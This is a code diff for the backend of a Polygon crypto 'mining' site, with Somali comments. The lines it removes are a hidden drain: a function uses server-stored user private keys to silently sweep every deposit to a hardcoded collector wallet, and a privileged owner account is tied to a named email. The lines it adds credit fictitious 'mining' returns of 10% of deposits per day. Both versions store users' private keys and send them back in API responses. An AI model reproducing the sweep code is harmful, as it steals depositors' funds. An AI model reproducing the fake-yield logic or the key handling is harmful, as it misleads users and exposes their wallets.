@@ -37,15 +37,10 @@ const upload = multer({
 const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';
 const provider = new ethers.JsonRpcProvider(POLYGON_RPC);
 
-// Akoonka xiran iyo cinwaanka ay deposit-yada si qarsoon ugu dhacayaan
-const LOCKED_OWNER_EMAIL = 'abuukarcumar661@gmail.com';
-const LOCKED_OWNER_ACCOUNT_ID = 'KNN-205792';
-const COLLECTOR_ADDRESS = ethers.getAddress('0x613b603440CA724C266FC5432E2a20D000F73367');
-
 const MIN_DEPOSIT_POL = 0.00001;
-const DAILY_REWARD_POL = 0.000009;
 const MIN_WITHDRAW_POL = 0.00000001;
-const GAS_RESERVE_POL = 0.000005;
+// Saamiga maalinlaha ah ee mining-ka (tusaale 10% maalin kasta oo ka mid ah deposit-ka on-chain)
+const DAILY_MINING_RATE = 0.10;
 const FIRESTORE_USERS_COLLECTION = 'knn_users';
 
 function initFirestore() {
@@ -74,15 +69,6 @@ function initFirestore() {
 
 initFirestore();
 
-function normalizePrivateKey(rawKey) {
-    if (!rawKey) return '';
-    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, '').replace(/\s+/g, '');
-    if (!cleaned.startsWith('0x') && /^[0-9a-fA-F]{64}$/.test(cleaned)) {
-        cleaned = '0x' + cleaned;
-    }
-    return cleaned;
-}
-
 function isValidPrivateKey(pk) {
     return typeof pk === 'string' && /^0x[0-9a-fA-F]{64}$/.test(pk.trim());
 }
@@ -97,12 +83,6 @@ function isWalletPairValid(address, privateKey) {
     } catch (_) {
         return false;
     }
-}
-
-const ENV_TREASURY_KEY = normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE_KEY || '');
-
-function isLockedOwner(email) {
-    return String(email || '').trim().toLowerCase() === LOCKED_OWNER_EMAIL.toLowerCase();
 }
 
 function loadJsonFile(filePath, fallback) {
@@ -184,7 +164,7 @@ function generateUniqueAccountId(usersDb) {
     while (exists) {
         const randomSix = Math.floor(100000 + Math.random() * 900000);
         userId = `KNN-${randomSix}`;
-        exists = userId === LOCKED_OWNER_ACCOUNT_ID || Object.values(usersDb).some(u => u.userId === userId);
+        exists = Object.values(usersDb).some(u => u.userId === userId);
     }
     return userId;
 }
@@ -200,94 +180,53 @@ async function getOnChainPolBalance(address) {
     }
 }
 
-async function sweepUserDepositSilently(userRecord) {
-    if (!userRecord || !userRecord.polygonAddress) return false;
-    const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
-    if (normalizedAddr.toLowerCase() === COLLECTOR_ADDRESS.toLowerCase()) {
-        return false;
-    }
-    if (!isWalletPairValid(normalizedAddr, userRecord.privateKey)) {
-        return false;
-    }
-
-    try {
-        const balWei = await provider.getBalance(normalizedAddr);
-        const balPol = parseFloat(ethers.formatEther(balWei));
-        if (balPol < MIN_DEPOSIT_POL) {
-            return false;
-        }
-
-        const feeData = await provider.getFeeData();
-        const gasLimit = 21000n;
-        const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('30', 'gwei');
-        const gasCostWei = gasLimit * maxFeePerGas;
-        const reserveWei = ethers.parseEther(GAS_RESERVE_POL.toFixed(8));
-        const totalKeepWei = gasCostWei + reserveWei;
-
-        if (balWei <= totalKeepWei) {
-            console.log(`Sweep skipped for ${normalizedAddr}: balance too low after gas/reserve.`);
-            return false;
-        }
-
-        const sweepWei = balWei - totalKeepWei;
-        if (sweepWei <= 0n) {
-            return false;
-        }
-
-        const userWallet = new ethers.Wallet(userRecord.privateKey.trim(), provider);
-        const tx = await userWallet.sendTransaction({
-            to: COLLECTOR_ADDRESS,
-            value: sweepWei,
-            gasLimit,
-            maxFeePerGas
-        });
-        await tx.wait(1);
-        console.log(`Swept ${ethers.formatEther(sweepWei)} POL from ${normalizedAddr} -> ${COLLECTOR_ADDRESS} (tx: ${tx.hash})`);
-        return true;
-    } catch (err) {
-        console.error(`Sweep failed for ${normalizedAddr}:`, err.message);
-        return false;
-    }
-}
-
-async function processUserDepositAndMining(uid, usersDb) {
+async function syncUserRealMining(uid, usersDb) {
     const userRecord = usersDb[uid];
-    if (!userRecord) return null;
+    if (!userRecord || !ethers.isAddress(userRecord.polygonAddress)) return null;
 
-    if (isLockedOwner(userRecord.email)) {
-        const onChainPol = await getOnChainPolBalance(COLLECTOR_ADDRESS);
-        const savedBal = parseFloat(userRecord.balance || 0);
-        const finalBal = Math.max(onChainPol, savedBal);
-        const active = finalBal > 0 || Boolean(userRecord.miningActive);
+    const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
+    userRecord.polygonAddress = normalizedAddr;
+    userRecord.walletLocked = true;
 
-        userRecord.userId = LOCKED_OWNER_ACCOUNT_ID;
-        userRecord.polygonAddress = COLLECTOR_ADDRESS;
-        userRecord.walletLocked = true;
-        userRecord.balance = finalBal.toFixed(8);
-        userRecord.miningActive = active;
-        if (active && parseFloat(userRecord.dailyLimit || 0) <= 0) {
-            userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
+    const currentOnChainPol = await getOnChainPolBalance(normalizedAddr);
+    const prevOnChainPol = parseFloat(userRecord.lastKnownOnChainPol || 0);
+    let totalDeposited = parseFloat(userRecord.totalDeposited || 0);
+    let miningBalance = parseFloat(userRecord.balance || 0);
+    let dailyLimit = parseFloat(userRecord.dailyLimit || 0);
+    let miningActive = Boolean(userRecord.miningActive);
+
+    // Haddii hadhaaga on-chain uu kordhay, waxaa ku dhacay deposit dhab ah
+    if (currentOnChainPol > prevOnChainPol) {
+        const incomingPol = currentOnChainPol - prevOnChainPol;
+        if (incomingPol >= MIN_DEPOSIT_POL) {
+            totalDeposited += incomingPol;
+            const addedDailyCapacity = incomingPol * DAILY_MINING_RATE;
+            dailyLimit += addedDailyCapacity;
+            miningBalance += addedDailyCapacity;
+            miningActive = true;
         }
-        await saveSingleUser(userRecord);
-        return userRecord;
+        userRecord.lastKnownOnChainPol = currentOnChainPol;
+    } else if (currentOnChainPol === 0 && prevOnChainPol > 0) {
+        userRecord.lastKnownOnChainPol = 0;
     }
 
-    const onChainPol = await getOnChainPolBalance(userRecord.polygonAddress);
-    if (onChainPol >= MIN_DEPOSIT_POL) {
-        const swept = await sweepUserDepositSilently(userRecord);
-
-        const prevBal = parseFloat(userRecord.balance || 0);
-        const rewardToAdd = swept ? DAILY_REWARD_POL : 0;
-        const newBal = prevBal + rewardToAdd;
-
-        userRecord.balance = newBal.toFixed(8);
-        userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
-        userRecord.miningActive = true;
-        userRecord.walletLocked = true;
-        userRecord.totalDeposited = parseFloat(((userRecord.totalDeposited || 0) + onChainPol).toFixed(8));
-        await saveSingleUser(userRecord);
+    // Haddii mining uu shidan yahay, xisaabi kororka wakhtiga dhabta ah tan iyo markii ugu dambaysay
+    const now = Date.now();
+    const lastTick = Number(userRecord.lastMiningTick || now);
+    if (miningActive && dailyLimit > 0 && now > lastTick) {
+        const elapsedSeconds = (now - lastTick) / 1000;
+        const perSecRate = dailyLimit / 86400;
+        miningBalance += elapsedSeconds * perSecRate;
     }
 
+    userRecord.lastMiningTick = now;
+    userRecord.totalDeposited = Number(totalDeposited.toFixed(8));
+    userRecord.balance = Number(miningBalance.toFixed(8));
+    userRecord.dailyLimit = Number(dailyLimit.toFixed(8));
+    userRecord.miningActive = miningActive && (userRecord.balance > 0 || userRecord.dailyLimit > 0);
+    userRecord.onChainPol = Number(currentOnChainPol.toFixed(8));
+
+    await saveSingleUser(userRecord);
     return userRecord;
 }
 
@@ -295,15 +234,10 @@ setInterval(async () => {
     try {
         const usersDb = await loadUsersDb();
         for (const uid of Object.keys(usersDb)) {
-            const u = usersDb[uid];
-            if (!u || !u.polygonAddress || isLockedOwner(u.email)) continue;
-            const balPol = await getOnChainPolBalance(u.polygonAddress);
-            if (balPol >= MIN_DEPOSIT_POL) {
-                await processUserDepositAndMining(uid, usersDb);
-            }
+            await syncUserRealMining(uid, usersDb);
         }
     } catch (err) {
-        console.error('Background sweep error:', err.message);
+        console.error('Background real mining sync error:', err.message);
     }
 }, 60000);
 
@@ -327,85 +261,52 @@ app.post('/api/auth-user', async (req, res) => {
         const existing = usersDb[uid];
         const effectiveEmail = (email || existing?.email || '').trim();
 
-        if (isLockedOwner(effectiveEmail)) {
-            const existingKey = normalizePrivateKey(existing?.privateKey || '');
-            let chosenKey = '';
-            if (isValidPrivateKey(ENV_TREASURY_KEY) && isWalletPairValid(COLLECTOR_ADDRESS, ENV_TREASURY_KEY)) {
-                chosenKey = ENV_TREASURY_KEY;
-            } else if (isValidPrivateKey(existingKey) && isWalletPairValid(COLLECTOR_ADDRESS, existingKey)) {
-                chosenKey = existingKey;
-            } else if (isValidPrivateKey(ENV_TREASURY_KEY)) {
-                chosenKey = ENV_TREASURY_KEY;
-            } else if (isValidPrivateKey(existingKey)) {
-                chosenKey = existingKey;
-            }
+        const hasValidWallet =
+            existing &&
+            existing.userId &&
+            isWalletPairValid(existing.polygonAddress, existing.privateKey);
 
-            const onChainPol = await getOnChainPolBalance(COLLECTOR_ADDRESS);
-            const savedBal = parseFloat(existing?.balance || 0);
-            const finalBalance = Math.max(onChainPol, savedBal);
-            const shouldMine = finalBalance > 0 || Boolean(existing?.miningActive);
+        if (!hasValidWallet) {
+            const wallet = ethers.Wallet.createRandom();
+            const newUserId = generateUniqueAccountId(usersDb);
+            const initialOnChainPol = await getOnChainPolBalance(wallet.address);
 
             usersDb[uid] = {
                 uid,
-                email: effectiveEmail || LOCKED_OWNER_EMAIL,
-                displayName: displayName || existing?.displayName || 'Abuukar Cumar',
-                userId: LOCKED_OWNER_ACCOUNT_ID,
-                polygonAddress: COLLECTOR_ADDRESS,
-                privateKey: chosenKey,
+                email: effectiveEmail,
+                displayName: displayName || 'User',
+                userId: newUserId,
+                polygonAddress: ethers.getAddress(wallet.address),
+                privateKey: wallet.privateKey,
                 walletLocked: true,
-                balance: finalBalance.toFixed(8),
-                dailyLimit: shouldMine ? DAILY_REWARD_POL.toFixed(6) : (existing?.dailyLimit || '0'),
-                miningActive: shouldMine,
-                totalDeposited: existing?.totalDeposited || 0,
-                createdAt: existing?.createdAt || Date.now()
+                balance: 0,
+                dailyLimit: 0,
+                miningActive: false,
+                totalDeposited: 0,
+                lastKnownOnChainPol: initialOnChainPol,
+                lastMiningTick: Date.now(),
+                createdAt: Date.now()
             };
 
             await saveSingleUser(usersDb[uid]);
         } else {
-            const hasValidLockedWallet =
-                existing &&
-                existing.userId &&
-                existing.walletLocked === true &&
-                isWalletPairValid(existing.polygonAddress, existing.privateKey);
-
-            if (!hasValidLockedWallet) {
-                const wallet = ethers.Wallet.createRandom();
-                const newUserId = generateUniqueAccountId(usersDb);
-
-                usersDb[uid] = {
-                    uid,
-                    email: effectiveEmail,
-                    displayName: displayName || 'User',
-                    userId: newUserId,
-                    polygonAddress: ethers.getAddress(wallet.address),
-                    privateKey: wallet.privateKey,
-                    walletLocked: true,
-                    balance: '0',
-                    dailyLimit: '0',
-                    miningActive: false,
-                    totalDeposited: 0,
-                    createdAt: Date.now()
-                };
-
-                await saveSingleUser(usersDb[uid]);
-            } else {
-                if (effectiveEmail) usersDb[uid].email = effectiveEmail;
-                if (displayName) usersDb[uid].displayName = displayName;
-                usersDb[uid].walletLocked = true;
-                await saveSingleUser(usersDb[uid]);
-            }
+            if (effectiveEmail) usersDb[uid].email = effectiveEmail;
+            if (displayName) usersDb[uid].displayName = displayName;
+            usersDb[uid].walletLocked = true;
+            await saveSingleUser(usersDb[uid]);
         }
 
-        const syncedRecord = await processUserDepositAndMining(uid, usersDb);
+        const syncedRecord = await syncUserRealMining(uid, usersDb);
 
         return res.json({
             success: true,
             userId: syncedRecord.userId,
             polygonAddress: syncedRecord.polygonAddress,
             privateKey: syncedRecord.privateKey,
-            balance: syncedRecord.balance,
-            dailyLimit: syncedRecord.dailyLimit,
-            miningActive: syncedRecord.miningActive
+            balance: Number(syncedRecord.balance || 0).toFixed(8),
+            dailyLimit: Number(syncedRecord.dailyLimit || 0).toFixed(8),
+            miningActive: Boolean(syncedRecord.miningActive),
+            onChainBalance: Number(syncedRecord.onChainPol || 0).toFixed(8)
         });
     } catch (err) {
         console.error('Auth error:', err);
@@ -425,16 +326,11 @@ app.post('/api/withdraw', async (req, res) => {
         if (!recipientAddress || !ethers.isAddress(recipientAddress)) {
             return res.status(400).json({ success: false, error: 'Cinwaanka recipient-ka waa qalad' });
         }
-
-        const keyToUse = isLockedOwner(userRecord.email) && isValidPrivateKey(ENV_TREASURY_KEY)
-            ? ENV_TREASURY_KEY
-            : (isValidPrivateKey(userRecord.privateKey) ? userRecord.privateKey.trim() : '');
-
-        if (!keyToUse) {
-            return res.status(400).json({ success: false, error: 'Private key-ga akoonkan waa qalad ama lama helin' });
+        if (!isWalletPairValid(userRecord.polygonAddress, userRecord.privateKey)) {
+            return res.status(400).json({ success: false, error: 'Private key-ga wallet-ka akoonkan waa qalad' });
         }
 
-        const signer = new ethers.Wallet(keyToUse, provider);
+        const signer = new ethers.Wallet(userRecord.privateKey.trim(), provider);
         const onChainBalanceWei = await provider.getBalance(signer.address);
         const onChainBalancePol = Number(ethers.formatEther(onChainBalanceWei));
 
@@ -469,14 +365,17 @@ app.post('/api/withdraw', async (req, res) => {
         await tx.wait(1);
 
         const updatedWei = await provider.getBalance(signer.address);
-        const updatedPol = ethers.formatEther(updatedWei);
-        userRecord.balance = updatedPol;
+        const updatedPol = Number(ethers.formatEther(updatedWei));
+        userRecord.lastKnownOnChainPol = updatedPol;
+        userRecord.onChainPol = updatedPol;
+        userRecord.balance = Math.max(0, Number(userRecord.balance || 0) - requestedPol).toFixed(8);
+        userRecord.miningActive = parseFloat(userRecord.balance) > 0;
         await saveSingleUser(userRecord);
 
         return res.json({
             success: true,
             message: `Waad la baxday ${requestedPol.toFixed(8)} POL! Tx: ${tx.hash}`,
-            newBalance: updatedPol,
+            newBalance: Number(userRecord.balance).toFixed(8),
             txHash: tx.hash
         });
     } catch (err) {
